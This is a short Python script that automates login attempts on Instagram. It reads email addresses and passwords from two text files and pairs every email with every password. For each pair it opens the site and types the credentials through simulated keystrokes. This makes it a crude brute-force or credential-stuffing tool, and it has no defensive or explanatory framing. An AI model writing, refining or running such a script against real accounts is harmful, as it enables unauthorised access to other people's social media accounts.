import email
import time
import webbrowser
from pynput.keyboard import Key, Controller
keyboard = Controller()
email_file = open('email.txt')
password_file = open('password.txt')

email_lines = email_file.readlines()
password_lines = password_file.readlines()

for line in email_lines:
    # print(line.strip())
    time.sleep(4)
    for passline in password_lines:
        webbrowser.open('https://www.instagram.com/')
        time.sleep(4)
        keyboard.press(Key.tab)
        keyboard.release(Key.tab)
        keyboard.press(Key.tab)
        keyboard.release(Key.tab)
        time.sleep(4)
        keyboard.type(line.strip())
        keyboard.press(Key.tab)
        keyboard.release(Key.tab)

        keyboard.type(passline.strip())
        time.sleep(3)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
        time.sleep(5)
